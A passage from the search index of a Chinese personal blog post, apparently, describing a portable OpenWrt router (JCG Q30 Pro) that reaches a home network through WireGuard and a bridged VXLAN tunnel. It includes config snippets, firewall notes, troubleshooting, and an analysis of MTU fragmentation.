<p>\u6d4b\u901f</p> <ul> <li>\u6709\u7ebf wg\uff1a420/430 (up/down\uff0c\u4e0b\u540c)</li> <li>\u65e0\u7ebf\uff08-60dBm signal/-90dBm noise\uff09<ul> <li>L2:  257/320</li> <li>L3\uff1a300/340</li> </ul> </li> </ul> <p>\u6700\u540e\u7684\u63a5\u53e3\u793a\u4f8b\uff1a </p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u8bbe\u5907\u9009\u62e9","title":"\u8bbe\u5907\u9009\u62e9","text":"<p>\u5728 tuna tg \u7fa4\u91cc\u63d0\u95ee\uff0c\u6709\u4eba\u63a8\u8350\u4e86 GL.iNet 3000 AT \u7684\u65b9\u6848\u3002\u770b\u4e86\u4e0b\u786e\u5b9e\u662f\u6211\u7684\u68a6\u4e2d\u60c5\u673a\uff0c\u4f53\u79ef\u53ea\u6709\u4e00\u4e2a\u5145\u7535\u5b9d\u90a3\u4e48\u5927\uff0c\u786c\u4ef6\u53c2\u6570\u5374\u975e\u5e38\u5145\u8db3\uff0c\u4e5f\u662f mt7981 \u7684\u65b9\u6848\uff0c\u652f\u6301 wifi6\uff0c\u751a\u81f3\u8fd8\u6709 2.5 G \u7f51\u53e3\u548c USB 3.0\u3002\u6700\u6587\u660e\u7684\u8fd8\u662f\u5b83\u7684 typec \u4f9b\u7535\uff0c\u5145\u7535\u5668\u4e5f\u53ef\u4ee5\u7701\u53bb\u4e86\uff0c\u751a\u81f3\u53ef\u4ee5\u7528\u5145\u7535\u5b9d\u4f9b\u7535\u3002\u4f46\u662f\u770b\u4e86\u770b\u4ef7\u683c\uff0cjd \u4e0a\u5356 550 \u5de6\u53f3\u7684\u4ef7\u683c\u3002\u54b8\u9c7c\u4e8c\u624b\u4ef7\u683c\u4e5f\u7ef4\u6301\u5728 380 \u4ee5\u4e0a\u3002\u611f\u89c9\u548c 70 \u5757\u7684\u5176\u5b83 mt7981 \u65b9\u6848\u6027\u4ef7\u6bd4\u8fd8\u662f\u4f4e\u4e86\u4e00\u622a\u3002\u5e0c\u671b\u4ee5\u540e\u54b8\u9c7c\u4ef7\u683c\u80fd\u964d\u4e0b\u6765\u5427\uff0c\u6211\u89c9\u5f97\u76ee\u524d\u6bd4\u8f83\u5408\u7406\u7684\u4ef7\u683c\u5e94\u8be5\u5728 200 \u5de6\u53f3\u3002</p> <p></p> <p>\u6700\u540e\u6211\u8d2d\u5165\u4e86 \u6377\u7a00 JCG Q30 Pro\uff0c\u4e3b\u8981\u770b\u91cd\u4e86\u5b83\u5929\u7ebf\u53ef\u6298\u53e0\u7684\u8bbe\u8ba1\uff08\u7c7b\u4f3c\u7684\u8bbe\u8ba1\u8fd8\u6709 CMCC rax3000 \u5b9a\u5236\u7248\u548c\u5c0f\u7c73 3000AT\uff09\u3002\u521a\u5f00\u59cb\u672c\u6765\u60f3\u4e70 cmcc rax3000\uff08110\u5143\uff09\uff0c\u4f46\u662f\u8ba9\u5356\u5bb6\u6bd4\u5bf9\u4e86\u4e0b\u5927\u5c0f\u540e\uff08\u56fe\u4e2d\u662f A4 \u7eb8\uff09\uff0c\u53d1\u73b0\u548c\u6211\u7684 AX6S \u5dee\u4e0d\u591a\u5927\uff08\u611f\u89c9\u4e0d\u592a\u5bb9\u6613\u653e\u8fdb\u80cc\u5305\uff09\uff0c\u56e0\u6b64\u5c31\u6ca1\u4e70\u3002</p> <p></p> <p>jcg q30 pro \u4e0e A4 \u7eb8\u5bf9\u6bd4\uff08\u53d1\u73b0\u539f\u6765\u66f4\u5927\uff09</p> <p></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#wg-\u8bbe\u7f6e","title":"wg \u8bbe\u7f6e","text":"<p>\u7531\u4e8e\u8bbe\u5907\u53ea\u7528\u4e8e\u4e34\u65f6\u63a5\u5165\u5185\u7f51\uff0c\u6545\u4e0d\u6253\u7b97\u4f7f\u7528 wg_s2s \u63a5\u53e3\uff0c\u800c\u662f\u4f7f\u7528 wg0 \u63a5\u53e3\uff0c\u5c31\u50cf\u6211\u7684\u5176\u5b83\u624b\u673a\u3001\u7b14\u8bb0\u672c\u8bbe\u5907\u4e00\u6837\u3002</p> <p>\u7531\u4e8e wg \u7684\u914d\u7f6e\u7f51\u4e0a\u5f88\u591a\u4e86\uff0c\u8fd9\u91cc\u5c31\u4e0d\u5177\u4f53\u5c06\u5982\u4f55\u914d\u7f6e\u4e86\uff0c\u53ea\u63d0\u51e0\u4e2a\u91cd\u70b9\u3002</p> <ul> <li>\u672c\u5730\u76d1\u542c\u7aef\u53e3\u4e0d\u7528\u8bbe\u7f6e\uff0c\u968f\u673a\u5373\u53ef\uff0c\u56e0\u4e3a\u662f\u4e3b\u52a8\u8fde\u63a5\u5230\u5bf9\u9762\u3002\u8fd9\u6837\u9632\u706b\u5899 input \u89c4\u5219\u4e5f\u7701\u4e86\uff08conntrack \u4f1a\u81ea\u52a8\u5141\u8bb8\u4e3b\u52a8\u5411\u5916\u6d41\u91cf\u7684 input\uff09</li> <li>wg0 \u5f00\u542f NAT\uff0c\u8fd9\u6837\u8bbe\u5907\u4e0a\u4efb\u610f\u5730\u5740\u90fd\u53ef\u4ee5\u901a\u8fc7 wg0 \u63a5\u53e3\u4e0a\u7f51\uff0c\u5e76\u4e14\u4e24\u4fa7 allowed_ips \u4ec5\u9700\u8bbe\u7f6e wg0 \u63a5\u53e3\u5730\u5740\u5373\u53ef<ul> <li>\u8fd9\u91cc\u4fbf\u643a\u8def\u7531\u5668 allowed_ips \u8bbe\u7f6e\u4e86 0.0.0.0/0\uff0c\u56e0\u6b64\u6240\u6709\u4e0a\u7f51\u6d41\u91cf\u4f1a\u8d70 wg\u3002\u5f53\u7136\u4e5f\u53ef\u4ee5\u8bbe\u7f6e\u53ea\u6709\u5185\u7f51\u6d41\u91cf\u8d70 wg\uff0c\u5176\u4f59\u8fd8\u662f\u901a\u8fc7\u539f\u672c\u7684 wan \u4e0a\u7f51\u3002</li> </ul> </li> </ul>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u63a5\u53e3\u914d\u7f6e","title":"\u63a5\u53e3\u914d\u7f6e","text":"<p>jcg_q30p</p> <pre><code>config interface 'wg0'\n        option proto 'wireguard'\n        option private_key 'xxx'\n        list addresses '10.0.31.103/32'\n\nconfig wireguard_wg0\n        option description 'op1'\n        option public_key 'eVL0uj6T5wEMTs039QF9t+JtXOchHJWROCoq/4kEKlE='\n        list allowed_ips '10.0.31.1/32'\n        list allowed_ips '0.0.0.0/0'\n        option route_allowed_ips '1'\n        option endpoint_host 'op1.yfycloud.site'\n        option endpoint_port '51820'\n        option persistent_keepalive '25'\n</code></pre> <p>op1</p> <pre><code>config wireguard_wg0\n        option public_key 'vXU/50/NA4tAG8fou1or1N22sZz3suCoYu/q4MkiBhE='\n        option description 'jcg_q30'\n        list allowed_ips '10.0.31.103/32'\n        option route_allowed_ips '1'\n        option persistent_keepalive '25'\n</code></pre>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u9632\u706b\u5899","title":"\u9632\u706b\u5899","text":"<p>\u540e\u9762 vxlan \u7684\u9632\u706b\u5899\u4e5f\u5728\u8fd9\u4e00\u8d77\u8bf4\u660e</p> <ul> <li>lan \u5141\u8bb8 forward \u5230 wan \u548c wg0<ul> <li>forward wan\uff1a\u867d\u7136\u73b0\u5728\u9ed8\u8ba4\u8def\u7531\u8d70 wg0\uff0c\u4f46\u662f\u8bf4\u4e0d\u5b9a\u4e4b\u540e\u6709\u8d70 wan \u7684\u5206\u6d41\u9700\u6c42</li> </ul> </li> <li>wg0 \u5141\u8bb8 input\uff0c\u56e0\u4e3a\u540e\u9762 vxlan \u8fd8\u9700\u8981\u7528\u5230 input udp 4798\uff0c\u8fd9\u6837\u8be5\u89c4\u5219\u4e5f\u7701\u4e86</li> </ul> <p>\u5173\u4e8e lan2</p> <ul> <li>lan2 \u4e0d\u9700\u8981 forward \u5230\u4efb\u4f55 zone\uff0c\u56e0\u4e3a lan2 \u662f\u5bf9\u7aef\u7684\u865a\u62df\u5ef6\u4f38\uff0c\u53ef\u4ee5\u770b\u4f5c\u662f\u5bf9\u7aef\u7684\u4e00\u90e8\u5206\u3002\u56e0\u6b64\u6700\u597d\u4e0d\u8981\u548c\u672c\u5730\u6709\u592a\u591a\u4ea4\u96c6\uff0c\u5426\u5219\u9700\u8981\u6dfb\u52a0\u592a\u591a\u7279\u6b8a\u8def\u7531\u89c4\u5219\u3002\u8981\u60f3\u8bbf\u95ee lan2\uff0c\u6b63\u5e38\u901a\u8fc7 wg0 \u5373\u53ef\u3002</li> </ul> <p></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#vxlan-\u8bbe\u7f6e","title":"vxlan \u8bbe\u7f6e","text":"<p>vxlan \u7684\u4e00\u7bc7\u597d\u6587\u7ae0VXLAN &amp; Linux (bernat.ch)</p> <p>\u4e4b\u6240\u4ee5\u9009\u62e9 vxlan \u800c\u4e0d\u662f gre\uff0c\u662f\u56e0\u4e3a vxlan \u652f\u6301\u591a\u5bf9\u591a\u7684\u8fde\u63a5\uff0c\u8fd9\u6837\u5982\u679c\u4ee5\u540e\u66f4\u6362\u5176\u5b83\u4fbf\u643a\u8def\u7531\u5668\uff0c\u4e0d\u7528\u6bcf\u6b21\u90fd\u5728 op1 \u4e0a\u589e\u52a0 gre \u63a5\u53e3\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u5b89\u88c5","title":"\u5b89\u88c5","text":"<p>\u5b89\u88c5\u5fc5\u8981\u7684\u5305</p> <pre><code>opkg install kmod-vxlan luci-proto-vxlan vxlan tcpdump ip-bridge\n</code></pre> <p>\u5b89\u88c5\u540e\u9700\u8981<code>/etc/init.d/network restart</code> \u91cd\u542f\u7f51\u7edc\uff0cluci \u754c\u9762\u4e2d\u624d\u53ef\u4ee5\u6dfb\u52a0 vxlan \u534f\u8bae\u63a5\u53e3\u3002</p> <p>pve modprobe \u9700\u8981\u7684 kernel mod</p> <p>\u5982\u679c\u4f60\u7684 openwrt \u662f\u5728 pve \u91cc\u7684 lxc \u5bb9\u5668\u3002\u90a3\u4e48\u53ef\u80fd\u9700\u8981\u8ba9\u4ee5\u4e0b mod \u5f00\u673a\u65f6\u81ea\u52a8\u52a0\u8f7d <pre><code>#/etc/module\n  vxlan\n  ip6_udp_tunnel\n  udp_tunnel\n</code></pre></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u914d\u7f6e","title":"\u914d\u7f6e","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u914d\u7f6e-vxlan-\u63a5\u53e3","title":"\u914d\u7f6e vxlan \u63a5\u53e3","text":"<p>vxlan \u7684\u914d\u7f6e\u4e5f\u975e\u5e38\u7b80\u5355\u3002\u67e5\u770b openwrt \u5173\u4e8e\u5177\u4f53\u9009\u9879\u7684\u89e3\u91ca [OpenWrt Wiki] Tunneling interface protocols</p> <ul> <li>\u6700\u597d\u7ed1\u5b9a\u4e00\u4e2a mac \u5730\u5740\uff0c\u4e0d\u7136\u4f1a\u6bcf\u6b21\u91cd\u542f\u4f1a\u53d1\u751f\u53d8\u5316</li> <li>\u8bbe\u7f6e\u4e0b mtu\uff0c\u56e0\u4e3a\u5e95\u5c42 wg0 \u662f 1420\uff0c\u51cf 50 \u4e3a 1370</li> </ul>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u914d\u7f6e-bridge","title":"\u914d\u7f6e bridge","text":"<p>\u8bbe\u7f6e\u597d vxlan0 \u63a5\u53e3\u540e\uff0c\u9700\u8981\u5c06\u5176\u548c bridge \u7ed1\u5b9a\u8d77\u6765\uff0c\u8fd9\u6837\u624d\u80fd\u548c\u5176\u5b83\u6b63\u5e38\u63a5\u53e3\u8fde\u63a5\u8d77\u6765\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u914d\u7f6e-lan2-\u63a5\u53e3","title":"\u914d\u7f6e lan2 \u63a5\u53e3","text":"<p>br-lan2 \u662f\u7269\u7406\u8bbe\u5907\u7684\u6982\u5ff5\uff0c\u914d\u7f6e dhcp server \u7b49\u8fd8\u9700\u8981\u521b\u5efa interface\u3002\u8fd9\u91cc\u6211\u4eec\u5728 br-lan2 \u8bbe\u5907\u4e0a\u521b\u5efa\u4e00\u4e2a lan2 \u63a5\u53e3\u3002</p> <p></p> <p>\u8fd9\u91cc\u521b\u5efa\u4e86\u4e00\u4e2a br-lan2 \u7684\u8bbe\u5907\uff0c\u5e76\u5728\u6b64\u4e4b\u4e0a\u521b\u5efa\u4e86\u4e00\u4e2a lan2 \u7684interface\uff0c\u4f5c\u4e3a dhcp client\uff0c\u4ece op1 \u90a3\u83b7\u5f97 ip \u5730\u5740\u3002</p> <p>\u8fd9\u91cc\u9700\u8981\u5f00\u542f<code>option defaultroute '0'</code>\uff0c\u5426\u5219 lan2 \u63a5\u53e3\u5c31\u4f1a\u66ff\u6362\u6389\u539f\u672c\u7684\u9ed8\u8ba4\u8def\u7531\u3002\u8fd9\u6837 lan \u5c31\u65e0\u6cd5\u901a\u8fc7 wg0 \u4e0a\u7f51\u4e86\u3002</p> <p>UPDATE\uff1alan2 \u63a5\u53e3\u63a8\u8350\u8bbe\u7f6e\u6210 Unmanaged\uff0c\u8fd9\u6837 lan2 \u63a5\u53e3\u4e0d\u4f1a\u83b7\u5f97\u5730\u5740\uff0c\u56e0\u6b64\u4e0d\u4f1a\u751f\u6210\u989d\u5916\u7684\u8def\u7531\u5e72\u6270\u539f\u672c\u7684\u7f51\u7edc\u3002</p> <p>lan2 \u63a5\u53e3\u672c\u8d28\u4e0a\u662f\u4e00\u6761\u8fde\u63a5\u5230 op1 \u7684\u865a\u62df\u94fe\u8def\uff0c\u56e0\u6b64\u548c\u672c\u7cfb\u7edf\u4ea4\u4e92\u8d8a\u5c11\u8d8a\u597d\u3002\u867d\u7136\u8fd9\u6837\u4f1a\u5bfc\u81f4\u8fde\u63a5 lan2 \u4f1a\u65e0\u6cd5\u8bbf\u95ee lan\u3002\u4f46\u662f\u6362\u6765\u4e86\u66f4\u7b80\u5355\u6e05\u6670\u7684\u7f51\u7edc\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#openwrt-\u914d\u7f6e\u6587\u4ef6","title":"openwrt \u914d\u7f6e\u6587\u4ef6","text":"<p>jcg_q30p</p> <ul> <li>peeraddr \u6dfb\u52a0\u5bf9\u7aef\u5730\u5740</li> </ul> <pre><code>config interface 'vxlan0'\n        option proto 'vxlan'\n        option peeraddr '10.0.31.1'\n        option port '4789'\n        option vid '8'\n        option mtu '1370'\n        option macaddr '12:0A:F7:78:24:B0'\n        option force_link '1'\n\nconfig device\n        option type 'bridge'\n        option name 'br-lan2'\n        list ports 'lan3'\n        list ports 'vxlan0'\n        option mtu '1370'\n        option bridge_empty '1'\n\nconfig interface 'lan2'\n        option proto 'none'\n        option device 'br-lan2'\n</code></pre> <p>op1\u3002\u7531\u4e8e\u8981\u8fde\u63a5\u591a\u4e2a peer\uff0c\u56e0\u6b64\u4f7f\u7528\u4e86 vxlan_peer \u7684\u683c\u5f0f</p> <pre><code>config interface 'vxlan0'\n        option proto 'vxlan'\n        option port '4789'\n        option vid '8'\n        option tunlink 'wg0'\n\nconfig vxlan_peer\n        option vxlan 'vxlan0'\n        option dst '10.0.31.103'\n\nconfig vxlan_peer\n        option vxlan 'vxlan0'\n        option dst 'xxx'   # \u5176\u5b83 vxlan \u8bbe\u5907\n</code></pre>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u521b\u5efa\u591a\u4e2a\u65e0\u7ebf-ssid","title":"\u521b\u5efa\u591a\u4e2a\u65e0\u7ebf SSID","text":"<p>\u5982\u56fe\u5728 5G \u8bbe\u5907\u4e0a\u521b\u5efa\u4e24\u4e2a SSID: JCG Q30 Pro 5G (L3) \u548c JCG Q30 Pro 5G (L2) \u5206\u522b\u7ed1\u5b9a\u5230 lan \u548c lan2\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u901a\u8fc7\u5207\u6362 wifi \u7684\u65b9\u5f0f\u5207\u6362\u7f51\u7edc\u4e86\u3002</p> <p></p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u8e29\u7684\u5751","title":"\u8e29\u7684\u5751","text":"","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u548c-bridge-\u6865\u63a5\u5931\u8d25","title":"\u548c bridge \u6865\u63a5\u5931\u8d25","text":"<p>\u521a\u5f00\u59cb\u5728 jcg_q30 \u4e0a\u6b7b\u6d3b\u65e0\u6cd5\u5c06 vxlan0 \u548c\u65b0\u521b\u5efa\u7684 br-vxlan \u6865\u63a5\u8d77\u6765\u3002\u53ea\u8981\u4e00\u6865\u63a5\uff0cvxlan0 \u8bbe\u5907\u5c31\u4f1a\u6d88\u5931\uff0c\u91cd\u542f vxlan \u540e\u6062\u590d\uff0c\u4f46\u662f br-vxlan \u53c8\u6d88\u5931\u3002</p> <p>\u4e0d\u786e\u5b9a\u662f\u54ea\u4e9b\u539f\u56e0\u4fee\u590d\u4e86\u95ee\u9898\uff0c\u8bb0\u5f55\u4e0b\u505a\u7684\u4e00\u4e9b\u6539\u52a8</p> <ul> <li>vxlan \u539f\u672c\u7ed1\u5b9a\u4e86\u63a5\u53e3 wg0\uff0c\u73b0\u5728\u5c06\u5176\u8bbe\u7f6e\u4e3a unspecific \uff08op1 \u4e0a\u4e5f\u4e00\u6837\uff09</li> <li>\u5220\u9664\u4e86\u539f\u672c\u7684 br-vxlan\uff0c\u6539\u540d\u4e3a br-lan2\uff0c\u52fe\u9009\u4e86 bring up empty bridge\u3002</li> </ul>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#\u548c\u65e0\u7ebf\u6865\u63a5\u540e\u4e0d\u8f6c\u53d1\u5e7f\u64ad","title":"\u548c\u65e0\u7ebf\u6865\u63a5\u540e\u4e0d\u8f6c\u53d1\u5e7f\u64ad","text":"<p>\u5c06\u65e0\u7ebf\u7ed1\u5b9a\u5230 lan2 \u7f51\u7edc\u540e\uff0c\u53d1\u73b0\u8bbe\u5907\u6ca1\u6cd5\u83b7\u5f97 ip \u5730\u5740\u3002tcpdump \u6293\u5305\uff0c\u53d1\u73b0 phy1-ap0 \u4e0a\u6536\u5230 dhcp request\uff0c\u4f46\u662f\u6ca1\u6709\u5c06\u5176\u4ece vxlan0 \u53e3\u53d1\u51fa\u53bb\u3002</p> <p>phy-ap0 \u4e3a 5G \u65e0\u7ebf\u5bf9\u5e94\u63a5\u53e3</p> <pre><code>34: phy0-ap0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-lan state UP group default qlen 1000\n    link/ether 50:33:f0:e2:fe:9e brd ff:ff:ff:ff:ff:ff\n    inet6 fe80::5233:f0ff:fee2:fe9e/64 scope link\n       valid_lft forever preferred_lft forever\n35: phy1-ap0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue master br-lan2 state UP group default qlen 1000\n    link/ether 52:33:f0:e2:fe:9e brd ff:ff:ff:ff:ff:ff\n    inet6 fe80::5033:f0ff:fee2:fe9e/64 scope link\n       valid_lft forever preferred_lft forever\n</code></pre> <p>\u540e\u9762\u53d1\u73b0\u4e0d\u77e5\u4e3a\u4f55\uff0c\u65e0\u7ebf\u63a5\u53e3 phy1-ap0 \u7684 master \u662f\u7a7a\u7684\u3002\u4e8e\u662f\u5220\u9664\u4e86\u539f\u672c\u7684 vxlan \u63a5\u53e3\uff0c\u91cd\u65b0\u521b\u5efa\u4e86 lan2\uff0c\u7136\u540e\u8bbe\u7f6e\u65e0\u7ebf\u7ed1\u5b9a\u5230 lan2 \u5c31\u597d\u4e86\u3002</p>","tags":["vxlan","openwrt","glinet","jcg_q30"]},{"location":"%E5%8D%9A%E5%AE%A2--%E7%BD%91%E7%BB%9C/2024/04/21/%E4%BE%BF%E6%90%BA%E8%B7%AF%E7%94%B1%E5%99%A8/#mtu-\u95ee\u9898\u6d88\u5931\u4e8c\u5c42\u5957\u4e09\u5c42","title":"MTU \u95ee\u9898\u6d88\u5931\uff1f\uff08\u4e8c\u5c42\u5957\u4e09\u5c42\uff09","text":"<p>\u4e4b\u524d\u535a\u5ba2\u5df2\u7ecf\u63a2\u8ba8\u8fc7\uff0c\u5982\u679c\u540c\u4e00\u4e2a\u4e8c\u5c42\u5b58\u5728 MTU \u4e0d\u4e00\u81f4\uff0c\u90a3\u4e48\u4f1a\u5b58\u5728\u5305\u56e0\u4e3a\u65e0\u6cd5\u5206\u7247\u800c\u4e22\u5931\u7684\u60c5\u51b5\u3002</p> <p>\u7136\u540e\u7531\u4e8e\u4f7f\u7528\u7684 ARM openwrt \u7cfb\u7edf\u7f16\u8bd1\u65f6\u53ef\u80fd\u6ca1\u6709\u5f00\u542f\u4e00\u4e9b flag\uff0c\u5bfc\u81f4\u4e4b\u524d\u8ba9 bridge \u53d8\u4e3a route \u7684 nft \u547d\u4ee4\u65e0\u6cd5\u8fd0\u884c\u3002\u4f46\u662f\u795e\u5947\u7684\u662f\uff0c\u8fd9\u6b21 ping \u5927\u5305\u65f6\u5c45\u7136\u6ca1\u6709\u51fa\u73b0\u4e0d\u901a\u7684\u60c5\u51b5\u3002\u7ecf\u8fc7\u7814\u7a76\uff0c\u53d1\u73b0\u539f\u56e0\u5728\u4e8e\u4e8c\u5c42\u96a7\u9053\u5957\u4e09\u5c42\u96a7\u9053\u540e\uff0c\u5e95\u5c42\u7684\u4e09\u5c42\u96a7\u9053\u4f1a\u5bf9\u4e0a\u5c42\u7684\u5305\u518d\u6b21\u5206\u7247\uff0c\u56e0\u800c\u4e0d\u4f1a\u5b58\u5728\u4e4b\u524d\u7684\u95ee\u9898\u3002\u4ee5\u4e0b\u662f\u5177\u4f53\u6293\u5305\u7ec6\u8282\u3002</p> <p>kvm-win10 \u8fde\u63a5\u4e86 jcg_q30p \u7684 wifi\uff0c\u83b7\u53d6\u5230\u4e86 ip\u3002\u4f7f\u7528\u8be5 ip ping op1</p> <pre><code>yfy@kvm-win10 UCRT64 ~\n$ ping -S 192.168.35.135 192.168.35.1 -l 2000 -t\n\n\u6b63\u5728 Ping 192.168.35.1 \u4ece 192.168.35.135 \u5177\u6709 2000 \u5b57\u8282\u7684\u6570\u636e:\n\u8bf7\u6c42\u8d85\u65f6\u3002\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=1ms TTL=64\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=1ms TTL=64\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=1ms TTL=64\n\u6765\u81ea 192.168.35.1 \u7684\u56de\u590d: \u5b57\u8282=2000 \u65f6\u95f4=1ms TTL=64\n</code></pre> <p>\u5728 jcg_q30p \u4e0a\u6293\u5305\uff0c\u53ef\u4ee5\u53d1\u73b0\u5305\u786e\u5b9e\u662f\u901a\u8fc7 vxlan \u4f20\u9012\u5230\u4e86 op1\u3002\u5e76\u4e14\u8bbe\u5907\u662f\u6309\u7167 MTU=1500 \u8fdb\u884c\u5206\u7247\u7684\uff0c\u6240\u4ee5\u7406\u8bba\u4e0a 1500 \u7684\u5305\u662f\u65e0\u6cd5\u901a\u8fc7 MTU = 1370 \u7684 vxlan0 \u7684\u3002\u4f46\u662f\u7ed3\u679c\u662f\u6b63\u786e\u6536\u5230\u4e86 icmp reply\u3002</p> <pre><code>14:45:02.547067 phy1-ap0 P   IP 192.168.35.135 &gt; 192.168.35.1: ICMP echo request, id 1, seq 506, length 1480\n14:45:02.547089 vxlan0 Out IP 192.168.35.135 &gt; 192.168.35.1: ICMP echo request, id 1, seq 506, length 1480\n14:45:02.547067 phy1-ap0 P   IP 192.168.35.135 &gt; 192.168.35.1: ip-proto-1\n14:45:02.547181 vxlan0 Out IP 192.168.35.135 &gt; 192.168.35.1: ip-proto-1\n14:45:02.547984 vxlan0 P   IP 192.168.35.1 &gt; 192.168.35.135: ICMP echo reply, id 1, seq 506, length 1344\n14:45:02.548031 phy1-ap0 Out IP 192.168.35.1 &gt; 192.168.35.135: ICMP echo reply, id 1, seq 506, length 1344\n14:45:02.547984 vxlan0 P   IP 192.168.35.1 &gt; 192.168.35.135: ip-proto-1\n14:45:02.548054 phy1-ap0 Out IP 192.168.35.1 &gt; 192.168.35.135: ip-proto-1\n</code></pre> <p>\u901a\u8fc7\u5728 jcg_q30p \u5bf9 wg0 \u63a5\u53e3\u8fdb\u884c\u6293\u5305\uff08vxlan \u5e95\u5c42\u57fa\u4e8e\u7684\u63a5\u53e3\uff09\uff0c\u53ef\u4ee5\u53d1\u73b0 icmp request \u5bf9\u5e94 3 \u4e2a\u5305\uff0creply \u5bf9\u5e94 2 \u4e2a\u5305\u3002</p> <p></p> <p>\u4ed4\u7ec6\u7814\u7a76\u540e\uff0c\u7ec8\u4e8e\u7406\u6e05\u4e86\u5b83\u4eec\u7684\u5bf9\u5e94\u5173\u7cfb\uff0c\u4ee5\u4e0b\u662f\u7ed3\u679c\u3002</p> <p>\u5c42\u5c42\u5c01\u88c5\u7684\u5305\u7684\u683c\u5f0f\u5982\u4e0b\uff1a</p> <pre><code>20         8     8       14    20          8    \nip(wg0)  | udp | vxlan | eth | ip(vxlan) | icmp | data=2000\n</code></pre> <p>\u9996\u5148\u5728 kvm-win10 \u7684\u89c6\u89d2\uff0c\u7531\u4e8e\u5047\u8bbe\u4e86 MTU = 1500\uff0c\u56e0\u6b64\u5bf9\u4e8e ip \u8d1f\u8f7d\u4e3a 2008B \u7684 icmp \u5305\uff082000 data + 8 header\uff09\uff0c\u9700\u8981\u6309\u7167 1480 + 528 \u5206\u7247\u6210\u4e24\u4e2a\u5305\u3002\u5404\u6dfb\u52a0 20B ip header \u540e\u4ea4\u7ed9 vxlan \u63a5\u53e3\u3002</p> <p>\u5728 vxlan \u7684\u89c6\u89d2\uff0c\u6709\u4e24\u4e2a ip \u5c42\u957f\u5ea6\u5206\u522b\u4e3a 1500, 548 \u7684\u5305\u8981\u53d1\u9001\u51fa\u53bb\u3002\u6dfb\u52a0\u4e86 udp + vxlan + eth \u540e\u5c31\u662f 1530, 578\uff08\u6ca1\u6709\u5305\u542b ip \u5934\u90e8\uff09\uff0c\u9700\u8981\u4ea4\u7ed9 wg0 \u53d1\u51fa\u53bb\u3002</p> <p>\u5728 wg0 \u89c6\u89d2\uff0c1530+20 \u660e\u663e\u8d85\u8fc7\u4e86\u81ea\u5df1 1420 \u7684 MTU\uff0c\u56e0\u6b64\u53c8\u9700\u8981\u5206\u6210\u4e24\u4e2a\u5305\u3002\u6309\u7167 1400 \u5206\u7247\uff0c\u5206\u4e3a 1400 + 130 \u4e24\u4e2a\u5305\u3002\u6dfb\u52a0 wg ip header \u540e\u5c31\u662f 1420 \u548c 150\u3002\u8fd9\u521a\u597d\u5bf9\u5e94 